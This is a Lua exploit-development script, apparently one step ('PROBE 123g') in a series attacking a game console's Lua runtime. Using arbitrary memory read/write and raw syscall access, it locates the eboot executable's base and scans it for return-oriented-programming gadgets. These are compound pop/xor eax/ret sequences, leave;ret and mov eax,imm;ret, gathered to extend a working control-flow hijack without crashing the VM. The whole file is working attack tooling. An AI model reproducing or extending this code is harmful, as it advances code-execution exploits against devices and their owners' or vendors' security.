-- CRASH_CLASS: LOW
-- PROBE 123g: Scan eboot for compound gadgets that pop + zero eax + ret
--
-- The single-gadget redirect works but any gadget that leaves eax
-- non-zero causes the Lua VM to try popping eax-many return values,
-- crashing the VM. We need compound gadgets:
--   pop rdi; xor eax,eax; ret  (5F 31 C0 C3)
--   pop rsi; xor eax,eax; ret  (5E 31 C0 C3)
--   pop rdx; xor eax,eax; ret  (5A 31 C0 C3)
--   pop rcx; xor eax,eax; ret  (59 31 C0 C3)
--   pop rax; xor eax,eax; ret  (58 31 C0 C3) — useless but proves pattern
--   pop rbp; xor eax,eax; ret  (5D 31 C0 C3)
--   pop r8;  xor eax,eax; ret  (41 58 31 C0 C3)
--
-- Also scan for:
--   pop REG; mov eax, 0; ret   (pop + B8 00 00 00 00 C3)
--   pop REG; pop REG; ... xor eax,eax; ret  (multi-pop chains)
--   Any sequence ending in 31 C0 C3 (xor eax,eax;ret) with useful pops before
--
-- Section A: 4-byte compound scan (pop + xor eax,eax + ret)
-- Section B: 5-byte compound scan (REX pop + xor eax,eax + ret)
-- Section C: leave;ret + pop rbp;ret scan
-- Section D: Scan for "pop REG; pop REG; xor eax,eax; ret" (6-byte)
-- Section E: Look backwards from every xor eax,eax;ret for useful prefixes

print("=== PROBE 123g: COMPOUND GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
print(string.format("[*] eboot base: 0x%08X_%08X", eboot_hi, eboot_lo))

if not eboot_base then print("ABORT") return end

local function ea(off)
    local lo = eboot_lo + off
    local hi = eboot_hi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return uint64(string.format("0x%X%08X", hi, lo))
end

-- Find eboot end
local eboot_end = 0x200000
for off = 0x200000, 0x500000, 0x1000 do
    if safe_rd(ea(off)) == nil then eboot_end = off; break end
    eboot_end = off + 0x1000
end
print(string.format("[*] eboot readable: %d KB", eboot_end / 1024))

-- =============================================
-- SECTION A: 4-byte compounds (pop REG; xor eax,eax; ret)
-- Pattern: XX 31 C0 C3 where XX is a pop register opcode
-- =============================================
print("")
print("--- SECTION A: pop REG; xor eax,eax; ret (4 bytes) ---")

local pop_names = {
    [0x58] = "pop rax",
    [0x59] = "pop rcx",
    [0x5A] = "pop rdx",
    [0x5B] = "pop rbx",
    [0x5C] = "pop rsp",
    [0x5D] = "pop rbp",
    [0x5E] = "pop rsi",
    [0x5F] = "pop rdi",
}

local compound_4 = {}
for off = 0, eboot_end - 4, 1 do
    -- Read at 4-byte aligned addresses, check all positions
    if off % 4 == 0 then
        local dw = safe_rd(ea(off))
        if dw then
            -- Check bytes: dw = b0 | b1<<8 | b2<<16 | b3<<24
            local b0 = dw % 256
            local b1 = math.floor(dw / 256) % 256
            local b2 = math.floor(dw / 65536) % 256
            local b3 = math.floor(dw / 16777216) % 256

            -- Pattern at off+0: b0=pop, b1=0x31, b2=0xC0, b3=0xC3
            if pop_names[b0] and b1 == 0x31 and b2 == 0xC0 and b3 == 0xC3 then
                compound_4[#compound_4 + 1] = {off, b0}
            end
            -- Pattern at off+1: b1=pop, b2=0x31, b3=0xC0, next=0xC3
            if pop_names[b1] and b2 == 0x31 and b3 == 0xC0 then
                local next_dw = safe_rd(ea(off + 4))
                if next_dw and (next_dw % 256) == 0xC3 then
                    compound_4[#compound_4 + 1] = {off + 1, b1}
                end
            end
            -- Pattern at off+2: b2=pop, b3=0x31, next_b0=0xC0, next_b1=0xC3
            if pop_names[b2] and b3 == 0x31 then
                local next_dw = safe_rd(ea(off + 4))
                if next_dw then
                    local nb0 = next_dw % 256
                    local nb1 = math.floor(next_dw / 256) % 256
                    if nb0 == 0xC0 and nb1 == 0xC3 then
                        compound_4[#compound_4 + 1] = {off + 2, b2}
                    end
                end
            end
            -- Pattern at off+3: b3=pop, next=31 C0 C3
            if pop_names[b3] then
                local next_dw = safe_rd(ea(off + 4))
                if next_dw then
                    local nb0 = next_dw % 256
                    local nb1 = math.floor(next_dw / 256) % 256
                    local nb2 = math.floor(next_dw / 65536) % 256
                    if nb0 == 0x31 and nb1 == 0xC0 and nb2 == 0xC3 then
                        compound_4[#compound_4 + 1] = {off + 3, b3}
                    end
                end
            end
        end
    end
    -- Progress
    if off % 0x80000 == 0 and off > 0 then
        print(string.format("  ... 0x%X (%d hits)", off, #compound_4))
    end
end

print(string.format("[A] Found %d compound gadgets:", #compound_4))
for _, hit in ipairs(compound_4) do
    local name = pop_names[hit[2]] or string.format("0x%02X", hit[2])
    print(string.format("  *** eboot+0x%X: %s; xor eax,eax; ret ***", hit[1], name))
end


-- =============================================
-- SECTION B: 5-byte (REX.B pop r8-r15; xor eax,eax; ret)
-- Pattern: 41 5X 31 C0 C3
-- =============================================
print("")
print("--- SECTION B: REX pop r8-r15; xor eax,eax; ret (5 bytes) ---")

local rex_pop_names = {
    [0x58] = "pop r8",
    [0x59] = "pop r9",
    [0x5A] = "pop r10",
    [0x5B] = "pop r11",
    [0x5C] = "pop r12",
    [0x5D] = "pop r13",
    [0x5E] = "pop r14",
    [0x5F] = "pop r15",
}

local compound_5 = {}
for off = 0, eboot_end - 8, 4 do
    local dw = safe_rd(ea(off))
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        local next_dw = safe_rd(ea(off + 4))
        local nb0 = next_dw and (next_dw % 256) or -1
        local nb1 = next_dw and (math.floor(next_dw / 256) % 256) or -1
        local nb2 = next_dw and (math.floor(next_dw / 65536) % 256) or -1

        -- Pattern at off+0: 41 5X 31 C0 C3
        if b0 == 0x41 and rex_pop_names[b1] and b2 == 0x31 and b3 == 0xC0 and nb0 == 0xC3 then
            compound_5[#compound_5 + 1] = {off, b1, "REX"}
        end
        -- Pattern at off+1
        if b1 == 0x41 and rex_pop_names[b2] and b3 == 0x31 and nb0 == 0xC0 and nb1 == 0xC3 then
            compound_5[#compound_5 + 1] = {off+1, b2, "REX"}
        end
        -- Pattern at off+2
        if b2 == 0x41 and rex_pop_names[b3] and nb0 == 0x31 and nb1 == 0xC0 and nb2 == 0xC3 then
            compound_5[#compound_5 + 1] = {off+2, b3, "REX"}
        end
    end
end

print(string.format("[B] Found %d REX compound gadgets:", #compound_5))
for _, hit in ipairs(compound_5) do
    local name = rex_pop_names[hit[2]] or string.format("0x%02X", hit[2])
    print(string.format("  *** eboot+0x%X: %s; xor eax,eax; ret ***", hit[1], name))
end


-- =============================================
-- SECTION C: leave;ret + pop rbp;ret
-- =============================================
print("")
print("--- SECTION C: leave;ret + pop rbp;ret ---")

local leave_count = 0
local leave_first = nil
local pop_rbp_off = nil

for off = 0, eboot_end - 4, 4 do
    local dw = safe_rd(ea(off))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- leave;ret (C9 C3)
    if b0 == 0xC9 and b1 == 0xC3 then
        leave_count = leave_count + 1
        if not leave_first then leave_first = off end
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        leave_count = leave_count + 1
        if not leave_first then leave_first = off+1 end
    end
    if b2 == 0xC9 and b3 == 0xC3 then
        leave_count = leave_count + 1
        if not leave_first then leave_first = off+2 end
    end

    -- pop rbp;ret (5D C3) — first only
    if not pop_rbp_off then
        if b0 == 0x5D and b1 == 0xC3 then pop_rbp_off = off end
        if b1 == 0x5D and b2 == 0xC3 then pop_rbp_off = off+1 end
    end
end

print(string.format("[C] leave;ret: %d instances, first at eboot+0x%X",
    leave_count, leave_first or 0))
print(string.format("[C] pop rbp;ret: %s",
    pop_rbp_off and string.format("eboot+0x%X", pop_rbp_off) or "NOT FOUND"))


-- =============================================
-- SECTION D: Look backwards from xor eax,eax;ret instances
-- Find all 31 C0 C3 in eboot, then check what's at -1, -2, -3
-- =============================================
print("")
print("--- SECTION D: Context before every xor eax,eax;ret ---")

local xor_hits = {}
for off = 0, eboot_end - 4, 4 do
    local dw = safe_rd(ea(off))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
        xor_hits[#xor_hits + 1] = off
    end
    if b1 == 0x31 and b2 == 0xC0 and b3 == 0xC3 then
        xor_hits[#xor_hits + 1] = off + 1
    end
end

print(string.format("[D] Found %d xor eax,eax;ret instances", #xor_hits))
print("[D] Checking prefixes:")

for _, xoff in ipairs(xor_hits) do
    -- Read byte at xoff-1
    if xoff >= 1 then
        local prev_dw = safe_rd(ea(xoff - 1))
        if prev_dw then
            local prev_b = prev_dw % 256
            local name = pop_names[prev_b]
            if name then
                print(string.format("  *** eboot+0x%X: %s; xor eax,eax; ret ***",
                    xoff - 1, name))
            end
        end
    end
    -- Read 2 bytes before (REX prefix)
    if xoff >= 2 then
        local prev_dw = safe_rd(ea(xoff - 2))
        if prev_dw then
            local pb0 = prev_dw % 256
            local pb1 = math.floor(prev_dw / 256) % 256
            if pb0 == 0x41 and rex_pop_names[pb1] then
                print(string.format("  *** eboot+0x%X: %s; xor eax,eax; ret ***",
                    xoff - 2, rex_pop_names[pb1]))
            end
        end
    end
    -- Check for 2-pop before xor (XX YY 31 C0 C3)
    if xoff >= 2 then
        local prev_dw = safe_rd(ea(xoff - 2))
        if prev_dw then
            local pb0 = prev_dw % 256
            local pb1 = math.floor(prev_dw / 256) % 256
            if pop_names[pb0] and pop_names[pb1] then
                print(string.format("  *** eboot+0x%X: %s; %s; xor eax,eax; ret ***",
                    xoff - 2, pop_names[pb0], pop_names[pb1]))
            end
        end
    end
end


-- =============================================
-- SECTION E: Scan for mov eax,N;ret (B8 XX XX XX XX C3)
-- These set eax to a specific value (the syscall number).
-- If we find mov eax,0;ret that's another safe return gadget.
-- =============================================
print("")
print("--- SECTION E: mov eax,imm;ret scan (first 20 hits) ---")

local mov_eax_hits = {}
for off = 0, eboot_end - 8, 4 do
    local dw = safe_rd(ea(off))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256

    -- B8 at any position, followed 5 bytes later by C3
    if b0 == 0xB8 then
        local ret_byte_dw = safe_rd(ea(off + 4))
        if ret_byte_dw then
            local rb = math.floor(ret_byte_dw / 256) % 256 -- byte at off+5
            if rb == 0xC3 then
                local imm = math.floor(dw / 256) -- 3 bytes
                local imm_top_dw = safe_rd(ea(off + 4))
                local imm_top = imm_top_dw and (imm_top_dw % 256) or 0
                local val = math.floor(dw / 256) % 16777216 + imm_top * 16777216
                if val <= 1000 then -- only interesting small values
                    mov_eax_hits[#mov_eax_hits + 1] = {off, val}
                end
            end
        end
    end
end

print(string.format("[E] Found %d mov eax,small;ret gadgets:", #mov_eax_hits))
for i, hit in ipairs(mov_eax_hits) do
    if i > 20 then print("  ... (truncated)"); break end
    print(string.format("  eboot+0x%X: mov eax,%d; ret", hit[1], hit[2]))
    if hit[2] == 0 then
        print("    *** mov eax,0;ret = SAFE RETURN GADGET ***")
    elseif hit[2] == 1 then
        print("    *** mov eax,1;ret = RETURN ONE LUA VALUE ***")
    end
end


print("")
print("=== PROBE 123g COMPLETE ===")
